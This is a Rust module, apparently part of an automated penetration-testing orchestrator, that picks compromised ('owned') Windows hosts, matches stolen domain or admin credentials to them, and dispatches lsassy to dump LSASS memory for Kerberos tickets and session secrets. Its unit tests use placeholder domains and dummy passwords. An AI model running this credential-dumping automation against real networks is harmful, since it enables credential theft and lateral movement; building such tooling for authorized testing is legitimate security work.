//! auto_lsassy_dump -- dump LSASS credentials from owned hosts via lsassy.
//!
//! After secretsdump or other lateral movement marks a host as owned,
//! this automation dispatches lsassy to dump LSASS process memory and
//! extract additional credentials (Kerberos tickets, DPAPI keys, etc.)
//! that secretsdump alone doesn't capture.
//!
//! This is complementary to secretsdump: secretsdump gets SAM/NTDS hashes,
//! while lsassy gets live session credentials from LSASS memory.

use std::sync::Arc;
use std::time::Duration;

use serde_json::json;
use tokio::sync::watch;
use tracing::{debug, info, warn};

use crate::orchestrator::dispatcher::Dispatcher;
use crate::orchestrator::state::*;

/// Dumps LSASS credentials from owned hosts.
/// Interval: 45s.
pub async fn auto_lsassy_dump(dispatcher: Arc<Dispatcher>, mut shutdown: watch::Receiver<bool>) {
    let mut interval = tokio::time::interval(Duration::from_secs(45));
    interval.set_missed_tick_behavior(tokio::time::MissedTickBehavior::Delay);

    loop {
        tokio::select! {
            _ = interval.tick() => {},
            _ = shutdown.changed() => break,
        }
        if *shutdown.borrow() {
            break;
        }

        if !dispatcher.is_technique_allowed("lsassy_dump") {
            continue;
        }

        let work: Vec<LsassyWork> = {
            let state = dispatcher.state.read().await;

            if state.credentials.is_empty() {
                continue;
            }

            let mut items = Vec::new();

            for host in &state.hosts {
                // Only target hosts we've already owned (secretsdump succeeded)
                if !host.owned {
                    continue;
                }

                let dedup_key = format!("lsassy:{}", host.ip);
                if state.is_processed(DEDUP_LSASSY_DUMP, &dedup_key) {
                    continue;
                }

                // Infer domain from hostname
                let domain = host
                    .hostname
                    .find('.')
                    .map(|i| host.hostname[i + 1..].to_lowercase())
                    .unwrap_or_default();

                // Find a credential for this host's domain
                let cred = state
                    .credentials
                    .iter()
                    .find(|c| {
                        !c.password.is_empty()
                            && (domain.is_empty() || c.domain.to_lowercase() == domain)
                            && !state.is_credential_quarantined(&c.username, &c.domain)
                    })
                    .or_else(|| {
                        // Fall back to any admin credential
                        state
                            .credentials
                            .iter()
                            .find(|c| c.is_admin && !c.password.is_empty())
                    })
                    .cloned();

                let cred = match cred {
                    Some(c) => c,
                    None => continue,
                };

                items.push(LsassyWork {
                    dedup_key,
                    host_ip: host.ip.clone(),
                    hostname: host.hostname.clone(),
                    domain,
                    credential: cred,
                });
            }

            items
        };

        for item in work {
            let payload = json!({
                "technique": "lsassy_dump",
                "target_ip": item.host_ip,
                "hostname": item.hostname,
                "domain": item.domain,
                "credential": {
                    "username": item.credential.username,
                    "password": item.credential.password,
                    "domain": item.credential.domain,
                },
            });

            let priority = dispatcher.effective_priority("lsassy_dump");
            match dispatcher
                .throttled_submit("credential_access", "credential_access", payload, priority)
                .await
            {
                Ok(Some(task_id)) => {
                    info!(
                        task_id = %task_id,
                        host = %item.host_ip,
                        hostname = %item.hostname,
                        "LSASS dump dispatched"
                    );
                    dispatcher
                        .state
                        .write()
                        .await
                        .mark_processed(DEDUP_LSASSY_DUMP, item.dedup_key.clone());
                    let _ = dispatcher
                        .state
                        .persist_dedup(&dispatcher.queue, DEDUP_LSASSY_DUMP, &item.dedup_key)
                        .await;
                }
                Ok(None) => {
                    debug!(host = %item.host_ip, "LSASS dump deferred");
                }
                Err(e) => {
                    warn!(err = %e, host = %item.host_ip, "Failed to dispatch LSASS dump");
                }
            }
        }
    }
}

struct LsassyWork {
    dedup_key: String,
    host_ip: String,
    hostname: String,
    domain: String,
    credential: ares_core::models::Credential,
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn dedup_key_format() {
        let key = format!("lsassy:{}", "192.168.58.22");
        assert_eq!(key, "lsassy:192.168.58.22");
    }

    #[test]
    fn dedup_set_name() {
        assert_eq!(DEDUP_LSASSY_DUMP, "lsassy_dump");
    }

    #[test]
    fn domain_from_hostname() {
        let hostname = "dc01.contoso.local";
        let domain = hostname
            .find('.')
            .map(|i| hostname[i + 1..].to_lowercase())
            .unwrap_or_default();
        assert_eq!(domain, "contoso.local");
    }

    #[test]
    fn domain_from_bare_hostname() {
        let hostname = "dc01";
        let domain = hostname
            .find('.')
            .map(|i| hostname[i + 1..].to_lowercase())
            .unwrap_or_default();
        assert_eq!(domain, "");
    }

    #[test]
    fn payload_structure_validation() {
        let cred = ares_core::models::Credential {
            id: "c1".into(),
            username: "admin".into(),
            password: "P@ssw0rd!".into(), // pragma: allowlist secret
            domain: "contoso.local".into(),
            source: "test".into(),
            is_admin: true,
            discovered_at: None,
            parent_id: None,
            attack_step: 0,
        };

        let payload = serde_json::json!({
            "technique": "lsassy_dump",
            "target_ip": "192.168.58.22",
            "hostname": "srv01.contoso.local",
            "domain": "contoso.local",
            "credential": {
                "username": cred.username,
                "password": cred.password,
                "domain": cred.domain,
            },
        });

        assert_eq!(payload["technique"], "lsassy_dump");
        assert_eq!(payload["target_ip"], "192.168.58.22");
        assert_eq!(payload["hostname"], "srv01.contoso.local");
        assert_eq!(payload["domain"], "contoso.local");
        assert_eq!(payload["credential"]["username"], "admin");
        assert_eq!(payload["credential"]["password"], "P@ssw0rd!"); // pragma: allowlist secret
        assert_eq!(payload["credential"]["domain"], "contoso.local");
    }

    #[test]
    fn work_struct_construction() {
        let cred = ares_core::models::Credential {
            id: "c1".into(),
            username: "testuser".into(),
            password: "P@ssw0rd!".into(), // pragma: allowlist secret
            domain: "contoso.local".into(),
            source: "test".into(),
            is_admin: false,
            discovered_at: None,
            parent_id: None,
            attack_step: 0,
        };

        let work = LsassyWork {
            dedup_key: "lsassy:192.168.58.22".into(),
            host_ip: "192.168.58.22".into(),
            hostname: "srv01.contoso.local".into(),
            domain: "contoso.local".into(),
            credential: cred,
        };

        assert_eq!(work.dedup_key, "lsassy:192.168.58.22");
        assert_eq!(work.host_ip, "192.168.58.22");
        assert_eq!(work.hostname, "srv01.contoso.local");
        assert_eq!(work.domain, "contoso.local");
        assert_eq!(work.credential.username, "testuser");
    }

    #[test]
    fn domain_extraction_from_fabrikam() {
        let hostname = "sql01.fabrikam.local";
        let domain = hostname
            .find('.')
            .map(|i| hostname[i + 1..].to_lowercase())
            .unwrap_or_default();
        assert_eq!(domain, "fabrikam.local");
    }

    #[test]
    fn dedup_key_with_various_ips() {
        let ips = ["192.168.58.10", "192.168.58.240", "192.168.58.1"];
        for ip in &ips {
            let key = format!("lsassy:{ip}");
            assert!(key.starts_with("lsassy:"));
            assert!(key.ends_with(ip));
        }
    }

    #[test]
    fn credential_preference_admin_flag() {
        let admin_cred = ares_core::models::Credential {
            id: "c1".into(),
            username: "domainadmin".into(),
            password: "AdminPass!".into(), // pragma: allowlist secret
            domain: "contoso.local".into(),
            source: "test".into(),
            is_admin: true,
            discovered_at: None,
            parent_id: None,
            attack_step: 0,
        };

        let regular_cred = ares_core::models::Credential {
            id: "c2".into(),
            username: "user1".into(),
            password: "UserPass!".into(), // pragma: allowlist secret
            domain: "contoso.local".into(),
            source: "test".into(),
            is_admin: false,
            discovered_at: None,
            parent_id: None,
            attack_step: 0,
        };

        let creds = [regular_cred, admin_cred];
        // Fallback logic: find admin credential
        let admin = creds.iter().find(|c| c.is_admin && !c.password.is_empty());
        assert!(admin.is_some());
        assert_eq!(admin.unwrap().username, "domainadmin");
    }
}
